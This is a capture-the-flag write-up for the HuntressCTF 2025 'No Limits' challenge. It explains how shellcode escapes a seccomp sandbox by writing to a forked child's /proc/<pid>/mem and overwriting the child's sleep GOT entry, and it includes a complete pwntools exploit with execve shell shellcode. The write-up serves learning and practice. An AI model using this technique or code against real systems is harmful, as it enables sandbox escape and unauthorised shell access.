---
title: HuntressCTF 2025 No Limits
draft: false
tags:
  - ctf
  - binary-exploitation
  - shellcode
---

# No Limits

> Even when you only have a few options, don't let anything hold you back!

We're provided an x86-64 ELF, with a decompilation that looks like

```cpp
004017a7  int32_t main(int32_t argc, char** argv, char** envp)

004017b3      void* fsbase
004017b3      int64_t rax = *(fsbase + 0x28)
004017ca      int32_t s
004017ca      __builtin_memset(s: &s, c: 0, n: 0x38)
00401810      pid_t rax_2 = fork()
0040181c      int64_t var_58_1
0040181c      int64_t var_1e
0040181c      if (rax_2 == 0)
0040182c          var_58_1 = malloc(bytes: 0x100)
0040183a          while (true)
0040183a              __builtin_strcpy(dest: &var_1e, src: "Hello world!\n")
00401868              if (strncmp(&var_1e, "Give me the flag!", 0x11) == 0)
00401874                  printf(format: "I will not give you the flag!")
00401896              if (strncmp(&var_1e, "exit", 4) == 0)
00401896                  break
004018a1              sleep(seconds: 5)
0040181c      else
004018ad          while (true)
004018ad              puts(str: "Enter the command you want to do…")
004018b7              menu()
004018cd              void var_34
004018cd              memset(&var_34, 0, 0xb)
004018d2              int32_t var_74 = 0
004018ec              fgets(buf: &var_34, n: 0xb, fp: stdin)
00401906              __isoc99_sscanf(s: &var_34, format: &data_4020b2, &var_74)
0040190b              int32_t rax_9 = var_74
00401911              if (rax_9 == 4)
00401911                  break
0040191f              if (rax_9 == 3)
00401a53                  puts(str: "Where do you want to execute cod…")
00401a69                  int64_t var_60
00401a69                  __isoc99_scanf(format: &data_40219b, &var_60)
00401a73                  ProtectProgram()
00401a78                  var_60()
00401a8b                  break
00401931              if (rax_9 == 1)
00401946                  puts(str: "How big do you want your memory …")
0040195e                  void var_29
0040195e                  fgets(buf: &var_29, n: 0xb, fp: stdin)
00401978                  int64_t var_68
00401978                  __isoc99_sscanf(s: &var_29, format: &data_4020df, &var_68)
00401982                  puts(str: "What permissions would you like …")
0040199a                  fgets(buf: &var_1e, n: 0xb, fp: stdin)
004019b4                  __isoc99_sscanf(s: &var_1e, format: &data_4020b2, &s)
004019c3                  fflush(fp: stdin)
004019d4                  char* buf = CreateMemory(var_68, s)
004019e2                  puts(str: "What do you want to include?")
004019fd                  fgets(buf, n: var_68.d, fp: stdin)
00401a13                  printf(format: "Wrote your buffer at %p\n", buf)
00401a1f                  free(mem: var_58_1)
00401a24                  var_58_1 = 0
00401931              else if (rax_9 == 2)
00401a33                  puts(str: "Debug information:")
00401a47                  printf(format: "Child PID = %d\n", zx.q(rax_2))
00401a9b      if (var_58_1 != 0)
00401aa4          free(mem: var_58_1)
00401ab0      int64_t var_50
00401ab0      free(mem: var_50)
00401ac7      if (rax == *(fsbase + 0x28))
00401acf          return 0
00401ac9      __stack_chk_fail()
00401ac9      noreturn
```

At a high-level overview, we create a fork (`rax_2`), and if we're executing inside the fork, we do a simple loop. Otherwise, if we're the parent process, we print a menu, ask for an input, and perform that action. Specifically, the `menu()` looks like:

```cpp
004013a1  int64_t menu()

004013ae      puts(str: "1) Create Memory")
004013b8      puts(str: "2) Get Debug Informationn")
004013c2      puts(str: "3) Execute Code")
004013d3      return puts(str: "4) Exit")
```

We have the option to create memory with an arbitrary size, permission, and payload. We also have the ability to execute that memory region. And lastly, we have the ability to see the PID of the child process from the earlier `fork()` call. At first, it seems like a simple shellcode injection into an arbitrary region that we create, but, there's an important `ProtectProgram()` function, which does some seccomp:

```cpp
00401443  int64_t ProtectProgram()

0040144f      int64_t var_10 = 0
00401463      int64_t rax = seccomp_init(0)
00401518      int32_t var_14_4 = 0 | seccomp_rule_add(rax, 0x7fff0000, 4, 0) | seccomp_rule_add(rax, 0x7fff0000, 5, 0) | seccomp_rule_add(rax, 0x7fff0000, 6, 0) | seccomp_rule_add(rax, 0x7fff0000, 8, 0) | seccomp_rule_add(rax, 0x7fff0000, 0xa, 0)
004015c7      int32_t var_14_9 = var_14_4 | seccomp_rule_add(rax, 0x7fff0000, 0xc, 0) | seccomp_rule_add(rax, 0x7fff0000, 0x15, 0) | seccomp_rule_add(rax, 0x7fff0000, 0x18, 0) | seccomp_rule_add(rax, 0x7fff0000, 0x20, 0) | seccomp_rule_add(rax, 0x7fff0000, 0x21, 0)
00401676      int32_t var_14_14 = var_14_9 | seccomp_rule_add(rax, 0x7fff0000, 0x38, 0) | seccomp_rule_add(rax, 0x7fff0000, 0x39, 0) | seccomp_rule_add(rax, 0x7fff0000, 0x3a, 0) | seccomp_rule_add(rax, 0x7fff0000, 0x3c, 0) | seccomp_rule_add(rax, 0x7fff0000, 0x3e, 0)
00401725      int32_t var_14_19 = var_14_14 | seccomp_rule_add(rax, 0x7fff0000, 1, 0) | seccomp_rule_add(rax, 0x7fff0000, 2, 0) | seccomp_rule_add(rax, 0x7fff0000, 0x60, 0) | seccomp_rule_add(rax, 0x7fff0000, 0x66, 0) | seccomp_rule_add(rax, 0x7fff0000, 0x68, 0)
0040175e      if ((var_14_19 | seccomp_rule_add(rax, 0x7fff0000, 0xe7, 0) | seccomp_load(rax)) == 0)
00401782          return seccomp_release(rax)
00401765      perror(s: "seccomp")
0040176f      exit(status: 1)
0040176f      noreturn
```

Asking ChatGPT what this does: it basically creates a syscall whitelist, and only allows the following syscalls:

```
write, open, stat, fstat, lstat, lseek, mprotect, brk,
access, getpid, dup, pipe, clone, fork, vfork, exit, kill,
gettimeofday, syslog, getuid, exit_group
```

So, interestingly, we don't have `read` or `execve`, which rules out the standard `read /flag.txt` or `execve /bin/sh`... But, remember, we have a child process running the same code, just in a different loop. And, this means the child never entered into the conditional which invokes our `ProtectProgram()`, meaning the child also has no seccomp protections (which means, we can get `execve`!). How do we get code execution within the child though? The answer is quite simple, and [this writeup](https://blog.bi0s.in/2020/08/24/Pwn/GCTF20-Writeonly/) was an amazing starting point. Basically, because we have `write()` and `lseek()`, we can write to `/proc/<pid>/mem` of the child process (and we know the PID because of the debug option). We simply open that file, lseek to where we want to write, and write our shellcode. There's a couple gotchas here though. Firstly, we need to know _where_ to write our shellcode within the child. An easy answer is `menu()` because it's RWX and the child doesn't use it. The next question is, "how do we hijack control flow?" We need our child to actually enter into `menu()`, which it natively does not do. Looking back at the child loop:

```cpp
0040181c      if (rax_2 == 0)
0040182c          var_58_1 = malloc(bytes: 0x100)
0040183a          while (true)
0040183a              __builtin_strcpy(dest: &var_1e, src: "Hello world!\n")
00401868              if (strncmp(&var_1e, "Give me the flag!", 0x11) == 0)
00401874                  printf(format: "I will not give you the flag!")
00401896              if (strncmp(&var_1e, "exit", 4) == 0)
00401896                  break
004018a1              sleep(seconds: 5)
```

It does call `sleep()`, so we could overwrite GOT's sleep to point to `menu()` instead. And all of this is fortunately doable because there is no PIE on the binary, so our addresses will never change. Putting it all together, the plan is as follows:

- Get the PID of the child from `fork()` via the `debug` option
- Create shellcode which does the following:
	- `open`s `/proc/<pid>/mem`
	- `lseek` to `menu()` address
	- `write`s our injected shellcode (this can be anything, but in our case, we will do an execve bin/sh to get a shell)
	- `lseek`s to the `sleep()` entry in the GOT
	- `write`s to point `sleep()` to `menu()` address
- Creates a memory region 
- Allocates a large enough size to it
- Sets the permissions to 7 (read, write, execute)
- Gets the allocated memory region address
- Executes the allocated memory region

And because our loader shellcode only contains `open`, `lseek`, and `write`, it bypasses seccomp. It will then write our injected shellcode to `/proc/<pid>/mem`, specifically at `menu()`, the child will hit `sleep()` after ~5ish seconds, jump to `menu()`, and execute our injected shellcode without any seccomp restrictions!

```python
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = "10.1.225.148"
PORT = 9999

SLEEP_GOT = 0x4040A8 # readelf -r ./no_limits | grep sleep
SHELLCODE_ADDR = 0x4013A1 # objdump -d ./no_limits | grep menu


def connect():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process("./no_limits")


def build_path_shellcode(pid):
    path = f"/proc/{pid}/mem\x00"
    path_bytes = path.encode()
    chunks = [path_bytes[i : i + 8] for i in range(0, len(path_bytes), 8)]
    chunks.reverse()

    path_setup = ""
    for chunk in chunks:
        chunk_padded = chunk.ljust(8, b"\x00")
        val = u64(chunk_padded)
        path_setup += f"mov r9, {hex(val)}\npush r9\n"
    return path_setup


def main():
    io = connect()

    shell = asm(r"""
        /* put "/bin/sh\0" on stack */
        xor rax, rax
        mov rcx, 0x0068732f6e69622f   /* "/bin/sh\x00" little-endian */
        push rcx
        mov rbx, rsp                  /* rbx -> "/bin/sh" */

        /* push "-i\0" on stack (2 bytes + zero) */
        mov rcx, 0x692d                /* bytes: 2d 69 00.. = "-i\0" */
        push rcx
        mov rsi, rsp                   /* rsi -> "-i" */

        /* build argv array: ["/bin/sh", "-i", NULL] */
        xor rax, rax
        push rax                       /* NULL terminator */
        push rsi                       /* pointer to "-i" */
        push rbx                       /* pointer to "/bin/sh" */
        mov rsi, rsp                   /* rsi -> argv */

        xor rdx, rdx                   /* envp = NULL */
        mov rdi, rbx                   /* filename -> "/bin/sh" */
        mov rax, 59                    /* execve syscall number */
        syscall
    """)

    print(f"Generated execve shellcode length: {len(shell)}")

    io.recvuntil(b"Exit\n")
    io.sendline(b"2")

    io.recvuntil(b"Debug information:\n")
    io.recvuntil(b"Child PID = ")
    pid = int(io.recvline().strip())
    print(f"Child PID: {pid}")

    path_setup = build_path_shellcode(pid)

    sc = asm(f"""
        {path_setup}
        mov rdi, rsp
        mov rsi, 2
        xor rdx, rdx
        mov rax, 2
        syscall
        
        test rax, rax
        js end
        
        mov r8, rax
        
        mov rdi, r8
        mov rsi, {hex(SHELLCODE_ADDR)}
        xor rdx, rdx
        mov rax, 8
        syscall
        
        mov rdi, r8
        lea rsi, [rip + shellcode]
        mov rdx, {hex(len(shell))}
        mov rax, 1
        syscall
        
        mov rdi, r8
        mov rsi, {hex(SLEEP_GOT)}
        xor rdx, rdx
        mov rax, 8
        syscall
        
        mov rdi, r8
        lea rsi, [rip + got_payload]
        mov rdx, 8
        mov rax, 1
        syscall
        
        end:
        jmp end
        
        got_payload:
        .quad {hex(SHELLCODE_ADDR)}
        
        shellcode:
    """)

    sc += shell
    print(f"Generated parent shellcode length: {len(sc)}")
    print(f"Will write shellcode to child at: {hex(SHELLCODE_ADDR)}")
    print(f"Will overwrite sleep GOT at: {hex(SLEEP_GOT)} -> {hex(SHELLCODE_ADDR)}")

    io.recvuntil(b"Exit\n")
    io.sendline(b"1")
    print("Sent 1")

    io.recvuntil(b"How big do you want your memory to be?\n")
    io.sendline(str(len(sc) + 0x1000).encode())
    print("Sent shellcode size")

    io.recvuntil(b"What permissions would you like for the memory?\n")
    io.sendline(b"7")
    print("Sent 7 (rwx)")

    io.recvuntil(b"What do you want to include?\n")
    io.send(sc + b"\n")
    print("Sent parent shellcode")

    io.recvuntil(b"Wrote your buffer at ")
    addr_hex = io.recvline().strip().decode()
    print(f"Shellcode at: {addr_hex}")

    io.recvuntil(b"Exit\n")
    io.sendline(b"3")
    print("Sent 3 (execute code)")

    io.recvuntil(b"Where do you want to execute code?\n")
    io.sendline(addr_hex.encode())
    print(f"Sent address: {addr_hex}")
    print("[*] Waiting for child to call sleep() (up to 5 seconds)...")

    io.interactive()


if __name__ == "__main__":
    main()
```

One issue I ran into was originally, I was using a minimal `execve` shellcode from the writeup I had found. It was working locally, but not remotely. After debugging (and by that, I mean asking ChatGPT why it wasn't working), it brought up some tty interactivity issues and recommended executing `/bin/sh -i` to force it to be interactive. That ended up working! So, as a reminder: if your payload works locally but not remotely, try different shellcodes. 